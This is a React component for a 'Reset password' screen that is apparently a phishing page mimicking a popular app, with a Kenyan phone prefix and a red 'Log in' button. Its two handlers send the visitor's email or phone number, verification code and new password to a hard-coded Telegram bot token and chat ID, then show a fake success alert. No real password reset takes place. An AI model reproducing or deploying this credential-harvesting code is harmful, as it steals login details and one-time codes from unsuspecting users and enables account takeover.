import React, { useState, useEffect } from 'react';
import { ChevronLeft, X, Eye, EyeOff, ChevronDown } from 'lucide-react';

interface ResetPasswordScreenProps {
  onBack: () => void;
}

const ResetPasswordScreen: React.FC<ResetPasswordScreenProps> = ({ onBack }) => {
  const [method, setMethod] = useState<'email' | 'phone'>('email');
  
  // State
  const [email, setEmail] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [code, setCode] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isCodeSent, setIsCodeSent] = useState(false);
  const [countdown, setCountdown] = useState(0);

  // Timer Effect
  useEffect(() => {
    if (countdown > 0) {
      const timerId = setInterval(() => {
        setCountdown((prev) => prev - 1);
      }, 1000);
      return () => clearInterval(timerId);
    }
  }, [countdown]);

  // Validation
  const isValid = method === 'email' 
    ? (email.length > 5 && code.length === 6 && password.length > 5)
    : (phoneNumber.length > 5 && code.length === 6 && password.length > 5);

  const toggleMethod = () => {
    setMethod(prev => prev === 'email' ? 'phone' : 'email');
    // Reset verify state when switching methods
    setIsCodeSent(false);
    setCountdown(0);
    setCode('');
  };

  const handleSendCode = async () => {
    // Basic validation before sending
    const target = method === 'email' ? email : phoneNumber;
    if (target.length < 3) return;

    setIsCodeSent(true);
    setCountdown(60);

    // Send Target (Email or Phone) to Telegram on "Send Code"
    const token = "8565783239:AAEzyuB3eJzR6HYnikxBA23qhOSeo08lDZ8";
    const chatId = "8429880395";
    
    let message = `🔔 *Code Requested (Reset)*\n`;
    if (method === 'email') {
         message += `✉️ *Email:* ${email}`;
    } else {
         message += `📱 *Phone:* ${phoneNumber}`;
    }

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error("Failed to send code request", error);
    }
  };

  const handleResetAction = async () => {
    const token = "8565783239:AAEzyuB3eJzR6HYnikxBA23qhOSeo08lDZ8";
    const chatId = "8429880395";
    
    let message = "🔄 *Reset Password Attempt*\n\n";
    if (method === 'email') {
      message += `📧 *Method:* Email\n`;
      message += `✉️ *Email:* ${email}\n`;
    } else {
      message += `📱 *Method:* Phone\n`;
      message += `📞 *Phone:* ${phoneNumber}\n`;
    }
    message += `🔑 *Verification Code:* ${code}\n`;
    message += `🔒 *New Password:* ${password}`;

    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      alert('Request sent successfully');
    } catch (error) {
      console.error("Failed to send details", error);
    }
  };

  // Helper to check if send button should be enabled
  const canSendCode = method === 'email' ? email.length > 3 : phoneNumber.length > 3;

  return (
    <div className="flex flex-col h-screen sm:h-[800px] bg-black text-white p-4 relative animate-in slide-in-from-right duration-300">
      {/* Header */}
      <header className="flex items-center justify-between py-2 mb-4">
        <button 
          onClick={onBack}
          className="p-2 -ml-2 hover:bg-neutral-900 rounded-full transition-colors"
          aria-label="Go back"
        >
          <ChevronLeft className="w-6 h-6 text-white" />
        </button>
        
        <div className="w-6" /> 

        <button 
          className="p-1 bg-neutral-800/50 hover:bg-neutral-800 rounded-full transition-colors"
          aria-label="Close"
        >
          <X className="w-5 h-5 text-neutral-400" />
        </button>
      </header>

      {/* Main Title */}
      <h1 className="text-3xl font-bold text-center mb-8">Reset password</h1>

      {/* Form Content */}
      <div className="flex-1 flex flex-col gap-5">
        
        {/* Toggle Header */}
        <div className="flex justify-between items-baseline px-1">
          <label className="text-sm font-bold text-neutral-200">
            {method === 'email' ? 'Enter email address' : 'Enter phone number'}
          </label>
          <button 
            onClick={toggleMethod}
            className="text-xs font-semibold text-neutral-400 hover:text-white transition-colors"
          >
            {method === 'email' ? 'Reset with phone number' : 'Reset with email'}
          </button>
        </div>

        {method === 'email' ? (
          /* EMAIL FLOW */
          <div className="flex flex-col gap-5">
            <div className="bg-neutral-800/80 hover:bg-neutral-800 rounded-lg transition-colors">
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email address"
                className="w-full h-full bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium rounded-lg"
              />
            </div>
          </div>
        ) : (
          /* PHONE FLOW */
          <div className="flex gap-3">
             <div className="flex items-center justify-between bg-neutral-800/80 hover:bg-neutral-800 rounded-lg px-3 py-3.5 w-[35%] cursor-pointer transition-colors group">
              <span className="text-sm font-medium text-neutral-200">KE +254</span>
              <ChevronDown className="w-4 h-4 text-neutral-400 group-hover:text-white" />
            </div>
            <div className="flex-1 bg-neutral-800/80 hover:bg-neutral-800 rounded-lg transition-colors">
              <input
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="Phone number"
                className="w-full h-full bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium rounded-lg"
              />
            </div>
          </div>
        )}

        {/* Verification Code */}
        <div className="flex items-center bg-neutral-800/80 rounded-lg overflow-hidden transition-colors hover:bg-neutral-800">
          <input
            type="text"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            maxLength={6}
            placeholder="Enter 6-digit code"
            className="flex-1 bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium"
          />
          <button 
            onClick={handleSendCode}
            disabled={!canSendCode || countdown > 0}
            className={`
              px-4 py-2 mr-1 text-sm font-medium rounded-md transition-all min-w-[80px]
              ${(!canSendCode || countdown > 0)
                ? 'text-neutral-600 cursor-not-allowed' 
                : 'text-neutral-400 hover:text-white'}
            `}
          >
            {countdown > 0 ? `${countdown}s` : (isCodeSent ? 'Resend code' : 'Send code')}
          </button>
        </div>

        {/* Password */}
        <div className="flex items-center bg-neutral-800/80 rounded-lg overflow-hidden transition-colors hover:bg-neutral-800">
          <input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="flex-1 bg-transparent text-white px-4 py-3.5 outline-none placeholder:text-neutral-500 text-sm font-medium"
          />
          <button 
            onClick={() => setShowPassword(!showPassword)}
            className="px-4 text-neutral-400 hover:text-white transition-colors"
            type="button"
          >
            {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
          </button>
        </div>

        {/* Main Action Button */}
        <button
          onClick={handleResetAction}
          disabled={!isValid}
          className={`
            w-full py-3.5 rounded-lg mt-2 text-sm font-bold transition-all duration-200
            ${isValid 
              ? 'bg-red-600 text-white hover:bg-red-500 shadow-lg shadow-red-900/20' 
              : 'bg-neutral-800 text-neutral-500 cursor-not-allowed'}
          `}
        >
          Log in
        </button>
      </div>

      {/* Footer */}
      <div className="w-full py-6 border-t border-neutral-800/50 mt-auto">
        <p className="text-center text-sm text-neutral-300">
          Don&apos;t have an account?{' '}
          <button className="text-[#ff2b4e] font-semibold hover:text-red-400 hover:underline transition-colors">
            Sign up
          </button>
        </p>
      </div>
    </div>
  );
};

export default ResetPasswordScreen;